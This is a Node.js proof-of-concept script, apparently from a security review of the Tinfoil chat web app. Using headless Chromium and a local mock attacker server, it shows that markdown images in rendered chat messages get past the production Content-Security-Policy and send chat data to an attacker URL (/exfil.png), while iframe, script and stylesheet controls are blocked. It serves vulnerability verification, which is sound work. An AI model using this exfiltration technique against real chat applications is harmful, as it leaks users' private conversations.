// Real-browser demonstration: serve the DOM produced by the chat's markdown
// pipeline under the EXACT production Content-Security-Policy from
// vercel.json, and show headless Chromium fetches the attacker-controlled
// image URL (carrying chat data) with no user interaction, while the
// negative controls (iframe, inline script, inline style) are blocked.
// Everything runs on loopback; no Tinfoil host is contacted.
import { createRequire } from 'node:module'
import https from 'node:https'
import { readFileSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const here = path.dirname(fileURLToPath(import.meta.url))
const repo = '/root/tinfoil-review/work/verify/webapp-render-xss--markdown-remote-image-exfil--poc/tinfoil-webapp'
const require = createRequire(path.join(here, 'package.json'))
const { chromium } = require('playwright')

const tls = {
  key: readFileSync(path.join(here, 'key.pem')),
  cert: readFileSync(path.join(here, 'cert.pem')),
}
const ATTACKER_PORT = 48443
const APP_PORT = 48444

const vercel = JSON.parse(readFileSync(path.join(repo, 'vercel.json'), 'utf8'))
const csp = vercel.headers[0].headers.find(
  (h) => h.key === 'Content-Security-Policy',
).value
console.log('[poc] production CSP from vercel.json:\n  ' + csp)

const attackerHits = []
const attacker = https.createServer(tls, (req, res) => {
  attackerHits.push(req.url)
  console.log('[attacker] received request:', req.url)
  res.writeHead(200, { 'content-type': 'image/png' })
  res.end()
})
await new Promise((r) => attacker.listen(ATTACKER_PORT, '127.0.0.1', r))

const rendered = readFileSync(path.join(here, 'rendered-message.html'), 'utf8')
const page =
  '<!doctype html><html><head><meta charset="utf-8"><title>Tinfoil Chat (local PoC)</title></head>' +
  '<body><main class="prose">' + rendered + '</main>' +
  // Page-level negative controls (NOT model content; proves the CSP header is enforced by the browser):
  `<iframe src="https://127.0.0.1:${ATTACKER_PORT}/should-be-blocked-iframe"></iframe>` +
  `<script>new Image().src="https://127.0.0.1:${ATTACKER_PORT}/should-be-blocked-inline-script"</script>` +
  `<link rel="stylesheet" href="https://127.0.0.1:${ATTACKER_PORT}/should-be-blocked-stylesheet">` +
  '</body></html>'
const app = https.createServer(tls, (req, res) => {
  res.writeHead(200, {
    'content-type': 'text/html; charset=utf-8',
    'Content-Security-Policy': csp,
  })
  res.end(page)
})
await new Promise((r) => app.listen(APP_PORT, '127.0.0.1', r))

const browser = await chromium.launch({ headless: true, args: ['--ignore-certificate-errors'] })
const ctx = await browser.newContext({ ignoreHTTPSErrors: true })
const tab = await ctx.newPage()
const cspViolations = []
tab.on('console', (m) => {
  if (/Content Security Policy/i.test(m.text())) cspViolations.push(m.text())
})
await tab.goto(`https://127.0.0.1:${APP_PORT}/chat`, { waitUntil: 'load' })
await tab.waitForTimeout(1500)
const imgs = await tab.$$eval('img', (els) => els.map((e) => e.src))
console.log('[poc] <img> elements in page:', imgs)
console.log('[poc] CSP violation reports in console:', cspViolations.length)
for (const v of cspViolations) console.log('   -', v.slice(0, 160))
await browser.close()
attacker.close()
app.close()

const exfil = attackerHits.filter((u) => u.startsWith('/exfil.png'))
const blocked = attackerHits.filter((u) => u.includes('should-be-blocked'))
console.log('\n[poc] attacker server hits:', attackerHits)
console.log(`[poc] RESULT: ${exfil.length} image request(s) carrying chat data reached the attacker; ${blocked.length} negative-control request(s) got through (expected 0)`)
for (const u of exfil) console.log('   leaked:', decodeURIComponent(new URL('https://x' + u).searchParams.get('d')))
process.exit(exfil.length >= 2 && blocked.length === 0 ? 0 : 1)
